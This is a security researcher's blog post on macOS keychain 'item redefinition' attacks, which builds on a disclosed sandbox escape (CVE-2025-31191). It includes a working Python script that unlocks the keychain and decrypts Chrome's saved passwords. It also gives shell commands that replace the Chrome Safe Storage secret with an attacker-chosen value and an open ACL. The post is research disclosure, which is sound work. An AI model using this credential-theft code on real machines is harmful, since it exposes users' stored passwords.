# On the dangers of key redefinition attacks on macOS
Earlier this year I released a [blogpost](https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/) detailing a macOS Sandbox Escape vulnerability I discovered, and got tracked as [CVE-2025-31191](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-31191).  
In this blogpost I want to share further thoughts about the class of attacks I uncovered, and how offensive security folks might use those.  

## Background - the Keychain
The [macOS Keychain](https://support.apple.com/guide/keychain-access/what-is-keychain-access-kyca1083/mac) is Apple’s secure storage system for sensitive user data, such as passwords, private keys, certificates, and secure notes.  
It is implemented as a set of SQLite-based keychain files (like `login.keychain-db`, `System.keychain`, etc.), each serving different scopes—personal, system-wide, or session-based.  
Items within a keychain are encrypted using per-item keys, which are in turn wrapped by a class key protected by the user’s login credentials and, depending on the item class, the [Secure Enclave](https://support.apple.com/guide/security/secure-enclave-sec59b0b31ff/web).  
Keychains support various item types, including generic passwords, internet passwords, cryptographic keys, and certificates.  
Access to these items is finely controlled using Access Control Lists (ACLs), which define what apps or processes can retrieve or modify specific entries.  
ACLs can enforce user presence (e.g., via Touch ID) or restrict access to a particular binary, offering strong per-item access guarantees in both GUI and command-line contexts.

### The structure of keychain files
Keychain files are located as physical files on the device:
- User keychains (like `login.keychain-db`) are stored at `~/Library/Keychains/`. Each user has their own folder here, often with a UUID-named subdirectory containing their keychains.
- System keychain is located at `/Library/Keychains/System.keychain`.
- System Root Certificates keychain (read-only, trusted root CAs) are at `/System/Library/Keychains/SystemRootCertificates.keychain`.
- iCloud keychain items are synced across devices and encrypted end-to-end, but locally cached data may reside in the user's keychain directory with additional protections.

Let's examine the structure of a user keychain:
```
jbo@McJbo ~ % sqlite3 /Users/jbo/Library/Keychains/*/keychain-2.db
SQLite version 3.36.0 2021-06-18 18:36:39
Enter ".help" for usage hints.
sqlite> .schema
CREATE TABLE sqlite_sequence(name,seq);
...
CREATE TABLE genp(rowid INTEGER PRIMARY KEY AUTOINCREMENT,cdat REAL,mdat REAL,desc BLOB,icmt BLOB,crtr INTEGER,type INTEGER,scrp INTEGER,labl BLOB,alis BLOB,invi INTEGER,nega INTEGER,cusi INTEGER,prot BLOB,acct BLOB NOT NULL DEFAULT '',svce BLOB NOT NULL DEFAULT '',gena BLOB,data BLOB,agrp TEXT NOT NULL,pdmn TEXT,sync INTEGER NOT NULL DEFAULT 0,tomb INTEGER NOT NULL DEFAULT 0,sha1 BLOB,vwht TEXT,tkid TEXT,musr BLOB NOT NULL,UUID TEXT,sysb INTEGER DEFAULT 0,pcss INTEGER,pcsk BLOB,pcsi BLOB,persistref BLOB NOT NULL,clip INTEGER NOT NULL DEFAULT 0,ggrp TEXT,UNIQUE(acct,svce,agrp,sync,vwht,tkid,musr,ggrp));
...
CREATE TABLE inet(rowid INTEGER PRIMARY KEY AUTOINCREMENT,cdat REAL,mdat REAL,desc BLOB,icmt BLOB,crtr INTEGER,type INTEGER,scrp INTEGER,labl BLOB,alis BLOB,invi INTEGER,nega INTEGER,cusi INTEGER,prot BLOB,acct BLOB NOT NULL DEFAULT '',sdmn BLOB NOT NULL DEFAULT '',srvr BLOB NOT NULL DEFAULT '',ptcl INTEGER NOT NULL DEFAULT 0,atyp BLOB NOT NULL DEFAULT '',port INTEGER NOT NULL DEFAULT 0,path BLOB NOT NULL DEFAULT '',data BLOB,agrp TEXT NOT NULL,pdmn TEXT,sync INTEGER NOT NULL DEFAULT 0,tomb INTEGER NOT NULL DEFAULT 0,sha1 BLOB,vwht TEXT,tkid TEXT,musr BLOB NOT NULL,UUID TEXT,sysb INTEGER DEFAULT 0,pcss INTEGER,pcsk BLOB,pcsi BLOB,persistref BLOB NOT NULL,clip INTEGER NOT NULL DEFAULT 0,ggrp TEXT,UNIQUE(acct,sdmn,srvr,ptcl,atyp,port,path,agrp,sync,vwht,tkid,musr,ggrp));
...
CREATE TABLE cert(rowid INTEGER PRIMARY KEY AUTOINCREMENT,cdat REAL,mdat REAL,ctyp INTEGER NOT NULL DEFAULT 0,cenc INTEGER,labl BLOB,alis BLOB,subj BLOB,issr BLOB NOT NULL DEFAULT '',slnr BLOB NOT NULL DEFAULT '',skid BLOB,pkhh BLOB,data BLOB,agrp TEXT NOT NULL,pdmn TEXT,sync INTEGER NOT NULL DEFAULT 0,tomb INTEGER NOT NULL DEFAULT 0,sha1 BLOB,vwht TEXT,tkid TEXT,musr BLOB NOT NULL,UUID TEXT,sysb INTEGER DEFAULT 0,pcss INTEGER,pcsk BLOB,pcsi BLOB,persistref BLOB NOT NULL,clip INTEGER NOT NULL DEFAULT 0,ggrp TEXT,UNIQUE(ctyp,issr,slnr,agrp,sync,vwht,tkid,musr,ggrp));
...
CREATE TABLE keys(rowid INTEGER PRIMARY KEY AUTOINCREMENT,cdat REAL,mdat REAL,kcls INTEGER NOT NULL DEFAULT 0,labl BLOB,alis BLOB,perm INTEGER,priv INTEGER,modi INTEGER,klbl BLOB NOT NULL DEFAULT '',atag BLOB NOT NULL DEFAULT '',crtr INTEGER NOT NULL DEFAULT 0,type INTEGER NOT NULL DEFAULT 0,bsiz INTEGER NOT NULL DEFAULT 0,esiz INTEGER NOT NULL DEFAULT 0,sdat REAL NOT NULL DEFAULT 0,edat REAL NOT NULL DEFAULT 0,sens INTEGER,asen INTEGER,extr INTEGER,next INTEGER,encr INTEGER,decr INTEGER,drve INTEGER,sign INTEGER,vrfy INTEGER,snrc INTEGER,vyrc INTEGER,wrap INTEGER,unwp INTEGER,data BLOB,agrp TEXT NOT NULL,pdmn TEXT,sync INTEGER NOT NULL DEFAULT 0,tomb INTEGER NOT NULL DEFAULT 0,sha1 BLOB,vwht TEXT,tkid TEXT,musr BLOB NOT NULL,UUID TEXT,sysb INTEGER DEFAULT 0,pcss INTEGER,pcsk BLOB,pcsi BLOB,persistref BLOB NOT NULL,clip INTEGER NOT NULL DEFAULT 0,ggrp TEXT,UNIQUE(kcls,klbl,atag,crtr,type,bsiz,esiz,sdat,edat,agrp,sync,vwht,tkid,musr,ggrp));
...
```

The output is heavily redacted for brevity, but illustrates the data:
- `genp` stands for Generic Passwords (things that aren't tied to internet passwords such as WiFi passwords or app logins).
- `inet` stores Internet Passwords (websites, FTP, mail accounts).
- `cert` stores certificate information.
- `keys` store private or public cryptographic keys.

Note that the secrets themselves are encrypted, so fetching the keychain files only gives you metadata.

### The security utility
You can use the `security` utility on macOS to interact with the keychain as well as unlocking passwords with it (if you have the user's password).  

```
jbo@McJbo ~ % security find-generic-password -s "my_secret"
keychain: "/Users/jbo/Library/Keychains/login.keychain-db"
version: 512
class: "genp"
attributes:
    0x00000007 <blob>="my_secret"
    0x00000008 <blob>=<NULL>
    "acct"<blob>="jbo"
    "cdat"<timedate>=0x32303234303531363032303934395A00  "20240516020949Z\000"
    "crtr"<uint32>=<NULL>
    "cusi"<sint32>=<NULL>
    "desc"<blob>=<NULL>
    "gena"<blob>=<NULL>
    "icmt"<blob>=<NULL>
    "invi"<sint32>=<NULL>
    "mdat"<timedate>=0x32303234303531363032313033365A00  "20240516021036Z\000"
    "nega"<sint32>=<NULL>
    "prot"<blob>=<NULL>
    "scrp"<sint32>=<NULL>
    "svce"<blob>="my_secret"
    "type"<uint32>=<NULL>
```

Note you can supply a `-w` to read the item but it pops up a password prompt:
```
jbo@McJbo ~ % security find-generic-password -s "my_secret" -w
OmgThisPasswordIsSecret!
```

There are more flags and operations `security` can do - feel free to read in the [manual page](https://ss64.com/mac/security.html).  

On top of the `security` utility, there is a builtin app called `Keychain Access` which can view and modify keychain items.  
Lastly, one can always programatically use the [keychain API](https://developer.apple.com/documentation/security/seckeychainitemcopyaccess(_:_:)) for accessing keychain items.

#### ACLs
One thing the `security` tool is lacking is to view keychain items' Access Control List (ACL).  
Keychain item ACLs define which applications or operations are permitted to access a specific secret, such as a password or private key.  
Each item can include a list of trusted apps, user interaction policies (e.g., requiring biometric approval), and fine-grained controls over read or use access.  
These ACLs are enforced by the Security framework, ensuring that even if a keychain item is visible, only authorized entities can retrieve or use its contents.

## Background - how CVE-2025-31191 worked
I was originally looking into macOS Sandbox escapes - specifically, ones that involve a mechanism called Security-Scoped-Bookmarks.  
That mechanism can save *persistent* access tokens to arbitrary files by a sandboxed app - and by definition - the sandboxed app must have access to that persistent storage.  
My thought was adding arbitrary items to that persistent storage (saved in a `.plist` file by Office, for instance) but those entries are HMAC-signed with a key.  
Long story short - that key is derived by some sort of "master key" saved in the keychain item `com.apple.scopedbookmarksagent.xpc`.  
That item is accessed by an unsandboxed daemon called the "Scoped Bookmarks Agent" that accepts IPC from sandboxed apps and grants them access to files, after checking the HMAC. This got me stuck for a while since the ACL for that keychain item does not allow me to view the secret master key - it only allows the `ScopedBookmarksAgent` to access that.  
Then I had an idea - what if instead of reading the secret, I would delete the existing keychain item and create a new one?
- This will invalidate all previous persistent file access, as this invalidates the HMAC items.
- However, from that point on I *know* the secret since I decided what it was - so I could *arbitrarily sign entries*.
- Note the ACL does not prevent the keychain item from being deleted.

That worked really well, and I call that technique "keychain item redefinition attack".  
Apple's fix, by the way, consists of a new keychain item called `com.apple.scopedbookmarksagent.xpc.encrypted` - I haven't investigated that yet, and it could be a cool area of research!

## Stealing browser secrets with key redefinition attacks
One idea that comes to mind is using the same concept of redefining a keychain item to control secrets.  
Usually that would be pointless, as attackers usually want to *steal* secrets rather than controlling new secrets, but it might help for some scenarios.  
One such scenario is how private data is stored in Chromium-based browsers.  
Chromium uses an internal module called `os_crypt` which encrypts sensitive data with the help of the OS:
- Windows uses [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) master password.
- On macOS, the keychain is used instead.

Let's see how attackers "normally" steal credentials:
```python
import subprocess
import sqlite3
import hashlib
import base64
import binascii

password = '' # Current user password goes here!

def decrypt_password(password, key):
    """
        Decrypts an encrypted password using the given key.
    """

    retval = ''
    if password != b'':
        iv = '20'*16
        master_key = hashlib.pbkdf2_hmac('sha1', key, b'saltysalt', 1003) # Salt and iterations taken from chrome's source os_crypt_mac.mm.
        master_key = master_key[:16]
        hex_key = binascii.hexlify(master_key)
        enc_password = base64.b64encode(password[3:])
        return subprocess.check_output("openssl enc -base64 -d -aes-128-cbc -iv '%s' -K %s <<< %s 2>/dev/null" % (iv, hex_key.decode('utf-8'), enc_password.decode('utf-8')), shell=True).decode('utf-8')
    return retval

# Get the encryption key by unlocking the keychain
login_data_path = os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/Login Data')
subprocess.check_output(['security', 'unlock-keychain', '-p', password, os.path.expanduser('~/Library/Keychains/login.keychain-db')])
encryption_key = subprocess.check_output(['security', 'find-generic-password', '-s', 'Chrome Safe Storage', '-w', os.path.expanduser('~/Library/Keychains/login.keychain-db')]).decode().replace('\n', '').encode()

# Fetch login data saved in Chrome
with sqlite3.connect(login_data_path) as conn:
    cursor = conn.cursor()
    querystr = 'SELECT origin_url, username_value, password_value FROM logins'
    cursor.execute(querystr)
    for row in cursor.fetchall():
        url, username, encrypted_password = row
        password = decrypt_password(encrypted_password, encryption_key)
        print(f'Action URL: {url}')
        print(f'Username: {username}')
        print(f'Password: {password}\n')
```

This looks like a lot - let's talk about the important parts:
- The function `decrypt_password` decrypts an encrypted password with the master key `key`. It does so with [PBKDF2](https://en.wikipedia.org/wiki/PBKDF2) - essentially "expanding" the secret `key`. It then uses `AES-CBC` to decrypt an encrypted password - this code uses the `openssl` utility but normally an attacker would try to avoid child processes.
- The main logic gets the login data for Chrome (under `~/Library/Application Support/Google/Chrome/Default/Login Data`) - this is where the encrypted login data (saved data for forms etc.) are saved.
- Then, it uses the `security` utility to *unlock the keychain* with the user's password - you can see here how one needs the user's password to interact with the keychain. Keychain will remain unlocked for a configurable time.
- We then use the `security` tool again to find the generic password for the `Chrome Safe Storage` item and use the `-w` flag to read the secret.
- That secret is then going to be used with `PBKDF` (as described earlier) to decrypt the items from the Login Data.

The problem for attackers is they sometimes do not know the user's password - and thus, no way to decrypt those saved form passwords.  
However - an attacker could just *set* the new password. Sure - this invalidates all existing data, but starting that point - an attacker could just decrypt arbitrary secrets since they are the ones who set up the password to begin with!  
Here is how it's done:
```
security delete-generic-password -a "Chrome Safe Storage"
security add-generic-password -A -a "Chrome Safe Storage" -w "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
```

This deletes the old master secret and sets a new one as `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA` instead.  
Note the `-A` flag which sets up an empty ACL for the item, making all applications accessible to this secret. Of course, a more sophisticated attacker could set up an ACL exclusive to Chrome.
Also note all Chromium browsers are similar but might have different names (e.g. you'll see an "Edge Safe Storage" for Edge and a "Brave Safe Storage" for Brave).  
More interestingly, this also works for Electron Apps that use V8 - for instance, `Claude Desktop`:

```
jbo@McJbo ~ % security find-generic-password -s "Claude Safe Storage"
keychain: "/Users/jbo/Library/Keychains/login.keychain-db"
version: 512
class: "genp"
attributes:
    0x00000007 <blob>="Claude Safe Storage"
    0x00000008 <blob>=<NULL>
    "acct"<blob>="Claude Key"
    "cdat"<timedate>=0x32303235303433303139313033355A00  "20250430191035Z\000"
    "crtr"<uint32>="aapl"
    "cusi"<sint32>=<NULL>
    "desc"<blob>=<NULL>
    "gena"<blob>=<NULL>
    "icmt"<blob>=<NULL>
    "invi"<sint32>=<NULL>
    "mdat"<timedate>=0x32303235303433303139313033355A00  "20250430191035Z\000"
    "nega"<sint32>=<NULL>
    "prot"<blob>=<NULL>
    "scrp"<sint32>=<NULL>
    "svce"<blob>="Claude Safe Storage"
    "type"<uint32>=<NULL>
```
